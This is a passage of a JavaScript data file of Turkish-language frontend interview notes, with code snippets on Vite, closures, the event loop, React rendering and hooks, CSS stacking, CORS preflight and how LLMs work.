// app.js
import { used } from './utils.js'
console.log(used())

// The bundler builds an AST, sees "unused" has no import anywhere
// in the static import graph, and DELETES it from the final bundle.
// This only works because ESM imports are static — the bundler
// can prove, at build time, that it's truly unused.`,
      },
    ],
  },

  {
    id: 'vite-neden-hizli',
    type: 'qa',
    title: "Vite neden webpack'ten çok daha hızlı hissettiriyor?",
    summary:
      "Dev'de hiç bundle yapmaz — tarayıcının native ES module import'unu kullanır, sadece istenen dosyayı anında dönüştürür.",
    body: 'Webpack dev server önce TÜM uygulamayı bundle\'lar. Vite\'ta başlangıç maliyeti dosya sayısından bağımsızdır.',
    tags: ['araçlar', 'performans'],
    code: [
      {
        label: 'Bundle-then-serve vs serve-on-demand',
        lang: 'js',
        snippet: `// Webpack dev: bundles the ENTIRE app graph before the server
// is even ready — 500 files means 500 files processed up front.

// Vite dev: browser requests exactly the modules a page needs,
// via native <script type="module">. Vite transforms EACH file
// on demand, the first time it's requested — not the other 499
// files the user hasn't navigated to yet.
import { helper } from '/src/utils.js' // browser fetches this directly,
                                         // Vite intercepts and transforms it

// Production build still bundles (via Rollup) — the speed win
// is specifically in the dev feedback loop.`,
      },
    ],
  },

  {
    id: 'source-map-nedir',
    type: 'qa',
    title: 'Source map nedir, neyi mümkün kılar?',
    summary:
      "Derlenmiş/minify edilmiş kodun her satırını, orijinal kaynak dosyadaki satıra eşleyen bir harita dosyası.",
    body: "Olmadan production hatası, minified kodda anlamsız bir karakter pozisyonu olarak görünür.",
    tags: ['araçlar'],
    code: [
      {
        label: 'What gets connected',
        lang: 'js',
        snippet: `// what ships to the browser (minified):
function a(b){return b.map(c=>c.id)}
//# sourceMappingURL=app.js.map

// app.js.map maps every position in that line back to:
// src/utils/extractIds.js, line 3: "return items.map(item => item.id)"

// DevTools reads the .map file and shows you the ORIGINAL file,
// original variable names, original line numbers — even though
// that's not what actually ran in the browser.`,
      },
    ],
  },

  // ─── Katman 10: LLM'lerin Çalışma Mantığı ───
  {
    id: 'llm-token-context-temperature',
    type: 'qa',
    title: "LLM'lerde token, context window, temperature ne anlama gelir?",
    summary:
      'Token: modelin işlediği kelime parçası. Context window: modelin görebildiği token sınırı. Temperature: rastgelelik miktarı.',
    body: "Context window dolunca en eski kısım modelin görüş alanından ÇIKAR — 'unuttu' izlenimi buradan gelir, aslında pencere sınırıdır.",
    tags: ['ai'],
    code: [
      {
        label: 'Temperature — same prompt, different determinism',
        lang: 'bash',
        snippet: `# temperature: 0 — nearly deterministic, always picks the
# highest-probability next token. Good for factual/code tasks.
"The capital of France is" -> "Paris" (almost always)

# temperature: 1.0 — samples more broadly across likely tokens.
# More varied, more "creative", also more likely to drift.
"The capital of France is" -> "Paris" | "beautiful" | "a city..."

# Context window exhaustion: once total tokens (prompt + history
# + response) exceed the limit, the OLDEST messages are dropped
# from what the model can see — not summarized, just gone.`,
      },
    ],
  },

  {
    id: 'llm-halusinasyon-neden-yapisal',
    type: 'qa',
    title: 'LLM halüsinasyonu neden yapısal bir sorun, hata değil?',
    summary:
      "Model 'doğru cevabı biliyorum' diye çalışmaz — bir sonraki en olası token'ı tahmin eder. Emin olmadığında da akıcı yazar.",
    body: 'Bilgi eksikliği ile üslup akıcılığı birbirinden bağımsız — model az bildiği konuda da tam kendinden emin görünebilir.',
    tags: ['ai'],
    code: [
      {
        label: 'Why fluency is not a confidence signal',
        lang: 'bash',
        snippet: `# The model doesn't have an "I don't actually know this" flag.
# It always produces the statistically most likely NEXT TOKEN —
# whether that token sequence happens to be true, or a plausible
# guess that fills the gap, looks identical at generation time.

# This is why asking "are you sure?" often doesn't help — it
# just generates another confident-sounding response, not a
# genuine check against ground truth. The fix is external:
# retrieval (RAG), citations, or human verification —
# not asking the model to try harder.`,
      },
    ],
  },

  {
    id: 'js-tek-thread-settimeout',
    type: 'qa',
    title: 'JavaScript tek thread\'liyken setTimeout nasıl "aynı anda" çalışır?',
    summary:
      'Çalışmaz — paralellik yok, sıra devri var. Zamanlayıcıyı tarayıcı bekler, süre dolunca callback kuyruğa girer.',
    body: 'JS motorunun tek call stack\'i vardır; senkron kod bitmeden hiçbir şey araya giremez. setTimeout işi tarayıcıya devreder, motor yoluna devam eder.',
    tags: ['javascript'],
    code: [
      {
        label: 'Blocking — the timer fires, but has to wait',
        lang: 'js',
        snippet: `setTimeout(() => console.log('timer done'), 100)

const start = Date.now()
while (Date.now() - start < 3000) {
  // synchronous busy-loop for 3s — call stack never empties
}

console.log('loop done')

// Output: "loop done", THEN "timer done".
// The 100ms elapsed long ago, but the callback just
// sits in the queue until the stack is free.`,
      },
    ],
  },

  {
    id: 'microtask-macrotask-await-sirasi',
    type: 'qa',
    title: 'Microtask, macrotask ve await — çalışma sırası nasıl işler?',
    summary:
      'Her macrotask\'tan sonra microtask kuyruğu TAMAMEN boşaltılır. await, kalan kodu microtask olarak planlar.',
    body: 'İki kuyruk var: microtask (Promise.then, queueMicrotask) ve macrotask (setTimeout, I/O). await bir satırda fonksiyonun geri kalanını microtask\'a atar ve hemen çıkar.',
    tags: ['javascript'],
    code: [
      {
        label: 'Predict the output order',
        lang: 'js',
        snippet: `console.log('1')

setTimeout(() => console.log('2'), 0) // macrotask

Promise.resolve().then(() => console.log('3')) // microtask

queueMicrotask(() => console.log('4')) // microtask

console.log('5')

// Don't scroll — write down your guess first.`,
      },
      {
        label: 'Answer — why this order',
        lang: 'js',
        snippet: `// Order: 1, 5, 3, 4, 2
//
// 1 and 5: synchronous, run immediately on the call stack.
// 3 and 4: microtasks, run once the stack is empty,
//          in the order they were scheduled.
// 2: macrotask, runs only after ALL microtasks are drained —
//    that's why setTimeout(fn, 0) always ends up last.`,
      },
    ],
  },

  {
    id: 'promise-all-allsettled-race-any',
    type: 'qa',
    title: 'Promise.all, allSettled, race, any — hangisi ne zaman?',
    summary:
      'all: hepsi ya da hiçbiri. allSettled: her birinin raporu. race: ilk biten. any: ilk başarılı.',
    body: 'Fark "ne zaman biter" ve "hata ne yapar" sorularında. Aşağıdaki iki örnek en sık kullanılan iki deseni gösteriyor.',
    tags: ['javascript'],
    code: [
      {
        label: 'race — timeout a real request',
        lang: 'js',
        snippet: `const timeout = new Promise((_, reject) =>
  setTimeout(() => reject(new Error('timeout')), 5000),
)

// Whichever settles first wins — success or failure
const data = await Promise.race([fetch('/api/report'), timeout])`,
      },
      {
        label: 'any — fall back across mirrors',
        lang: 'js',
        snippet: `// First SUCCESSFUL response wins; failures are ignored.
// Throws AggregateError only if all three reject.
const script = await Promise.any([
  fetch('https://cdn-a.example.com/lib.js'),
  fetch('https://cdn-b.example.com/lib.js'),
  fetch('https://cdn-c.example.com/lib.js'),
])`,
      },
      {
        label: 'all vs allSettled — one failure vs a full report',
        lang: 'js',
        snippet: `// all: ONE rejection kills the whole thing
const [a, b, c] = await Promise.all([taskA(), taskB(), taskC()])

// allSettled: never rejects — you get a per-item report
const results = await Promise.allSettled([taskA(), taskB(), taskC()])
results.forEach((r) =>
  r.status === 'fulfilled' ? use(r.value) : logError(r.reason),
)`,
      },
    ],
  },

  {
    id: 'closure-nedir-for-var-settimeout',
    type: 'qa',
    title: 'Closure nedir ve for-var-setTimeout neden 3 3 3 basar?',
    summary:
      'Fonksiyon, tanımlandığı ortama canlı referans taşır — değeri kopyalamaz. var tek değişken oluşturur, üçü de onu paylaşır.',
    body: 'Closure = fonksiyonun tanımlandığı scope\'a tuttuğu canlı bağ. var döngü boyunca TEK değişken oluşturur; let her turda YENİ bir binding açar.',
    tags: ['javascript'],
    code: [
      {
        label: 'Problem — three callbacks share one variable',
        lang: 'js',
        snippet: `for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0)
}
// Prints: 3 3 3
// The loop finishes (i = 3) before any callback runs;
// all three closures point at the SAME variable.`,
      },
      {
        label: 'Three fixes — what each closure actually captures',
        lang: 'js',
        snippet: `// 1. let: new binding per iteration
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0)
}

// 2. IIFE: copy the value into a fresh parameter
for (var i = 0; i < 3; i++) {
  ;((j) => setTimeout(() => console.log(j), 0))(i)
}

// 3. extra setTimeout argument: no closure involved at all
for (var i = 0; i < 3; i++) {
  setTimeout(console.log, 0, i)
}`,
      },
      {
        label: 'Closure as private state',
        lang: 'js',
        snippet: `function createCounter() {
  let count = 0 // not reachable from outside
  return {
    increment: () => ++count,
    current: () => count,
  }
}

const counter = createCounter()
counter.increment()
counter.current() // 1
counter.count // undefined — only the returned methods can touch it`,
      },
    ],
  },

  {
    id: 'react-stale-closure-interval',
    type: 'qa',
    title: 'React\'te stale closure: interval neden hep aynı state\'i görür?',
    summary:
      'Effect, kurulduğu render\'ın scope\'unu kapatır. Boş bağımlılık dizisi onu hiç tazelemez.',
    body: '[] bağımlılıklı bir effect, ilk render\'ın closure\'ında yaşar. count orada hep 0\'dır. Fonksiyonel güncelleme bu bayat değere hiç bakmaz.',
    tags: ['react', 'javascript'],
    code: [
      {
        label: 'Bug — counter gets stuck at 1',
        lang: 'jsx',
        snippet: `const [count, setCount] = useState(0)

useEffect(() => {
  const id = setInterval(() => {
    // "count" here is from the FIRST render's closure — always 0
    setCount(count + 1)
  }, 1000)
  return () => clearInterval(id)
}, []) // empty deps -> this closure is never refreshed`,
      },
      {
        label: 'Fix — functional update ignores the stale closure',
        lang: 'jsx',
        snippet: `useEffect(() => {
  const id = setInterval(() => {
    // React hands you the LATEST value; no closure read at all
    setCount((c) => c + 1)
  }, 1000)
  return () => clearInterval(id)
}, []) // interval is set up once, counts correctly forever`,
      },
    ],
  },

  {
    id: 'z-index-stacking-context',
    type: 'qa',
    title: 'z-index: 9999 neden z-index: 1\'in altında kalabilir?',
    summary:
      'z-index yalnızca kendi stacking context\'i içinde yarışır. opacity/transform/filter\'lı bir ata, çocuklarını kendi katmanına hapseder.',
    body: 'Bağlam açan bir eleman, tüm çocuklarıyla TEK BİR BİRİM olarak sıralanır. Çocuklar dışarıdaki elemanlarla asla doğrudan yarışamaz.',
    tags: ['css'],
    code: [
      {
        label: 'The trap — .child loses to .sibling',
        lang: 'css',
        snippet: `.parent {
  position: relative;
  opacity: 0.99; /* creates a NEW stacking context */
}

.child {
  position: absolute;
  z-index: 9999; /* only meaningful INSIDE .parent */
}

.sibling {
  position: relative;
  z-index: 1; /* competes with .parent as a whole, not with .child */
}

/* Real fight: .parent (z-index: auto) vs .sibling (z-index: 1)
   -> .sibling wins, .child stays underneath it. */`,
      },
      {
        label: 'Fix — Portal escapes every ancestor context',
        lang: 'jsx',
        snippet: `import { createPortal } from 'react-dom'

function Modal({ children }) {
  // renders at document.body, outside any parent's
  // opacity/transform/filter stacking context
  return createPortal(children, document.body)
}`,
      },
    ],
  },

  {
    id: 'position-containing-block',
    type: 'qa',
    title: 'absolute ve fixed elemanlar "neye göre" konumlanır?',
    summary:
      'absolute: en yakın positioned ataya göre. fixed: viewport\'a göre — ama atada transform varsa o ata olur.',
    body: 'Her positioned elemanın bir containing block\'u vardır. fixed için asıl sürpriz: ata zincirinde transform/filter varsa viewport değil o ata referans olur.',
    tags: ['css'],
    code: [
      {
        label: 'transform on an ancestor breaks fixed',
        lang: 'css',
        snippet: `.sidebar {
  transform: translateX(0); /* looks harmless, but... */
}

.sidebar .help-button {
  position: fixed; /* no longer relative to the viewport —
                       now relative to .sidebar */
  bottom: 16px;
  right: 16px;
}

/* Button scrolls WITH the page instead of staying put.
   Fix: drop the transform, or portal the button out. */`,
      },
    ],
  },

  {
    id: 'cors-hatasini-kim-uretir',
    type: 'qa',
    title: 'CORS hatasını kim üretir — sunucu mu, tarayıcı mı?',
    summary:
      'Tarayıcı. İstek genelde sunucuya ULAŞIR ve yanıt döner; tarayıcı yanıtı JS\'e vermez.',
    body: 'SOP (Same-Origin Policy) tarayıcının kuralıdır. Çözüm bu yüzden her zaman sunucu tarafındadır — frontend\'den "CORS çözmek" diye bir şey yoktur.',
    tags: ['tarayıcı', 'güvenlik'],
    code: [
      {
        label: 'Dev proxy — request looks same-origin',
        lang: 'js',
        snippet: `// next.config.js
module.exports = {
  async rewrites() {
    return [
      {
        source: '/api/:path*',
        destination: 'https://api.example.com/:path*',
      },
    ]
  },
}
// Browser hits /api (same-origin, no CORS involved);
// the Next.js server forwards it server-to-server.`,
      },
    ],
  },

  {
    id: 'cors-preflight-tetikleyici',
    type: 'qa',
    title: 'Preflight (OPTIONS) isteğini ne tetikler?',
    summary:
      '"Simple request" sınırını aşan her şey: JSON content-type, özel header, PUT/DELETE.',
    body: 'Tarayıcı riskli saydığı isteklerden önce OPTIONS ile izin sorar. credentials: \'include\' varken Allow-Origin \'*\' olamaz.',
    tags: ['tarayıcı', 'güvenlik'],
    code: [
      {
        label: 'What the browser asks',
        lang: 'bash',
        snippet: `OPTIONS /api/users HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type

# Triggered by: Content-Type: application/json
# (form-urlencoded would count as a "simple request")`,
      },
      {
        label: 'What the server must answer',
        lang: 'bash',
        snippet: `HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: content-type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400

# credentials: true -> Allow-Origin CANNOT be '*'
# Max-Age caches the preflight for 24h`,
      },
    ],
  },

  {
    id: 'react-ne-zaman-rerender',
    type: 'qa',
    title: 'Bir React bileşeni ne zaman re-render olur?',
    summary:
      'Üç durumda: kendi state\'i değişince, parent render olunca (props aynı olsa bile), abone olduğu context değişince.',
    body: '"Props değişince render olur" yanlış modeldir. Doğrusu: parent render olunca child da render olur — memo bu varsayılanı kırar.',
    tags: ['react'],
    code: [
      {
        label: 'Parent renders -> child renders, even with identical props',
        lang: 'jsx',
        snippet: `function Parent() {
  const [count, setCount] = useState(0)
  return (
    <>
      <button onClick={() => setCount(count + 1)}>{count}</button>
      {/* label never changes, but Child re-renders
          on every click anyway */}
      <Child label="static" />
    </>
  )
}
// To stop this: const Child = memo(function Child(...) {...})`,
      },
    ],
  },

  {
    id: 'react-memo-usecallback-ne-zaman',
    type: 'qa',
    title: 'React.memo ve useCallback ne zaman işe yarar, ne zaman yaramaz?',
    summary:
      'memo props\'u referansla karşılaştırır. Her render\'da yeni obje/fonksiyon geçiyorsan hiçbir işe yaramaz.',
    body: 'Önce referansı sabitle, sonra memo\'la — sıra bu. "Her şeye memo" render ucuzken zarar eder.',
    tags: ['react', 'performans'],
    code: [
      {
        label: 'Why memo does nothing here',
        lang: 'jsx',
        snippet: `const Row = memo(function Row({ item, onSelect }) {
  return <li onClick={onSelect}>{item.name}</li>
})

function List({ items }) {
  return items.map((item) => (
    <Row
      key={item.id}
      item={item}
      // NEW function reference on every render
      onSelect={() => select(item.id)}
    />
  ))
}
// Fix: wrap onSelect in useCallback, or pass id
// and build the handler inside Row itself.`,
      },
      {
        label: 'children-as-props — a memo-free escape hatch',
        lang: 'jsx',
        snippet: `// Before: Expensive re-renders on every count change
function Page() {
  const [count, setCount] = useState(0)
  return (
    <div onClick={() => setCount(count + 1)}>
      <Expensive />
    </div>
  )
}

// After: Expensive is created OUTSIDE the state owner.
// Page re-renders, but children stays the same reference.
function Page({ children }) {
  const [count, setCount] = useState(0)
  return <div onClick={() => setCount(count + 1)}>{children}</div>
}
// Usage: <Page><Expensive /></Page>`,
      },
    ],
  },

  {
    id: 'server-state-neden-usestate-yetmez',
    type: 'qa',
    title: 'Server state neden useState + useEffect ile yönetilmez?',
    summary:
      'Sahibi sunucu olan verinin dört derdi var: bayatlama, cache, retry, yarış durumu. Elle fetch hepsini sana bırakır.',
    body: 'React Query / SWR gibi araçlar bu dört problemi çözer. Çekirdek strateji: stale-while-revalidate — önce cache\'i göster, arkada tazele.',
    tags: ['react', 'mimari'],
    code: [
      {
        label: 'Manual fetch — all four problems left wide open',
        lang: 'jsx',
        snippet: `const [users, setUsers] = useState([])

useEffect(() => {
  fetch('/api/users')
    .then((r) => r.json())
    .then(setUsers)
}, [])

// 1. No cache — refetches on every mount
// 2. No dedupe — a second component fires the same request
// 3. No retry — a network blip leaves the list silently empty
// 4. No abort — setUsers can fire after unmount`,
      },
    ],
  },

  {
    id: 'derived-state-neden-tutulmaz',
    type: 'qa',
    title: 'Türetilmiş (derived) state neden state olarak tutulmaz?',
    summary:
      'Mevcut state\'ten hesaplanabilen değeri kopyalarsan iki doğruluk kaynağı olur; biri kayarsa UI yalan söyler.',
    body: 'Kural: başka state\'ten hesaplanabilen her değer, state DEĞİLDİR. Render sırasında hesapla, effect\'le senkronize etme.',
    tags: ['react', 'mimari'],
    code: [
      {
        label: 'Bug — two sources of truth drift apart',
        lang: 'jsx',
        snippet: `const [users, setUsers] = useState([])
const [query, setQuery] = useState('')
const [filtered, setFiltered] = useState([])

// needs a permanent sync effect to stay correct
useEffect(() => {
  setFiltered(users.filter((u) => u.name.includes(query)))
}, [users, query])

// Add a new way to update "users" that forgets to
// touch this effect, and "filtered" silently goes stale.`,
      },
      {
        label: 'Fix — compute it during render, no sync needed',
        lang: 'jsx',
        snippet: `const [users, setUsers] = useState([])
const [query, setQuery] = useState('')

// Single source of truth: users + query.
// filtered is correct by construction, every render.
const filtered = useMemo(
  () => users.filter((u) => u.name.includes(query)),
  [users, query],
)

// If the list is small, skip useMemo entirely:
// const filtered = users.filter((u) => u.name.includes(query))`,
      },
    ],
  },

  {
    id: 'ai-caginda-senior-junior-farki',
    type: 'konu',
    title: 'AI çağında senior\'u junior\'dan ayıran şey',
    summary:
      'Artık kod yazma hızı değil, AI\'ın ürettiğini yargılama derinliği. Üretim maliyeti düştü, doğrulama maliyeti düşmedi.',
    body: 'AI\'ın kodu yüzeyde ikna edicidir; hatalar sözdiziminde değil bağlamda, kenar durumlarında ve zamanlamada saklanır. "Çalışıyor mu?" değil, "ne zaman çalışmaz?" sorusu senioru ayırır.',
    tags: ['ai', 'kariyer'],
    pinned: true,
    code: [
      {
        label: 'AI output — looks correct at a glance',
        lang: 'jsx',
        snippet: `function useSearch(query) {
  const [results, setResults] = useState([])

  useEffect(() => {
    fetch(\`/api/search?q=\${query}\`)
      .then((r) => r.json())
      .then(setResults)
  }, [query])

  return results
}`,
      },
      {
        label: 'The senior questions — what falls out',
        lang: 'jsx',
        snippet: `// 1. Race condition: a slow "ab" response can arrive AFTER
//    the faster "abc" response and overwrite it on screen.
// 2. setResults can fire after the component unmounted.
// 3. query with "&" or spaces breaks the URL — not escaped.
//
// It "works" in the demo, but race handling, abort,
// and encoding are all missing.`,
      },
      {
        label: 'Reviewed version',
        lang: 'jsx',
        snippet: `function useSearch(query) {
  const [results, setResults] = useState([])

  useEffect(() => {
    const controller = new AbortController()

    fetch(\`/api/search?q=\${encodeURIComponent(query)}\`, {
      signal: controller.signal,
    })
      .then((r) => r.json())
      .then(setResults)
      .catch((err) => {
        if (err.name !== 'AbortError') setResults([])
      })

    // new query -> abort the stale request so it can never
    // overwrite a newer, faster response
    return () => controller.abort()
  }, [query])

  return results
}`,
      },
    ],
  },

  {
    id: 'useeffect-fonksiyon-bagimliligi',
    type: 'qa',
    title: 'useEffect bağımlılık dizisine fonksiyon koymak neden sonsuz döngü yapar?',
    summary:
      'Fonksiyon her render\'da yeni referans alır; effect bunu "değişti" sanıp tekrar çalışır, o da yeni render tetikler.',
    body: 'React bağımlılıkları Object.is ile karşılaştırır — referansa bakar, içeriğe değil. Üç çözüm var, tercih sırasıyla aşağıda.',
    tags: ['react', 'javascript'],
    code: [
      {
        label: 'Bug — infinite loop',
        lang: 'jsx',
        snippet: `function Profile({ userId }) {
  const [user, setUser] = useState(null)

  // NEW function reference on every single render
  const fetchUser = () => {
    fetch(\`/api/users/\${userId}\`)
      .then((r) => r.json())
      .then(setUser)
  }

  useEffect(() => {
    fetchUser()
  }, [fetchUser]) // reference changes every render -> loop

  return <div>{user?.name}</div>
}`,
      },
      {
        label: 'Fix 1 — move it inside the effect (most common)',
        lang: 'jsx',
        snippet: `function Profile({ userId }) {
  const [user, setUser] = useState(null)

  useEffect(() => {
    // no reference leaks out of the effect
    const fetchUser = () => {
      fetch(\`/api/users/\${userId}\`)
        .then((r) => r.json())
        .then(setUser)
    }
    fetchUser()
  }, [userId]) // only the real data dependency remains

  return <div>{user?.name}</div>
}`,
      },
      {
        label: 'Fix 2 — useCallback (if it\'s used elsewhere too)',
        lang: 'jsx',
        snippet: `const fetchUser = useCallback(() => {
  fetch(\`/api/users/\${userId}\`)
    .then((r) => r.json())
    .then(setUser)
}, [userId]) // reference only changes when userId does

useEffect(() => {
  fetchUser()
}, [fetchUser]) // now stable`,
      },
      {
        label: 'Fix 3 — hoist out of the component (no props/state used)',
        lang: 'jsx',
        snippet: `// module-level — reference never changes
function fetchUser(userId) {
  return fetch(\`/api/users/\${userId}\`).then((r) => r.json())
}

function Profile({ userId }) {
  const [user, setUser] = useState(null)

  useEffect(() => {
    fetchUser(userId).then(setUser)
  }, [userId])

  return <div>{user?.name}</div>
}`,
      },
    ],
  },
]

export function getAllTags() {
  const used = new Set()
  notes.forEach((n) => n.tags?.forEach((t) => used.add(t)))
  return TAGS.filter((t) => used.has(t))
}

export function getStats() {
  return {
    total: notes.length,
    qa: notes.filter((n) => n.type === 'qa').length,
    note: notes.filter((n) => n.type === 'note').length,
    konu: notes.filter((n) => n.type === 'konu').length,
  }
}
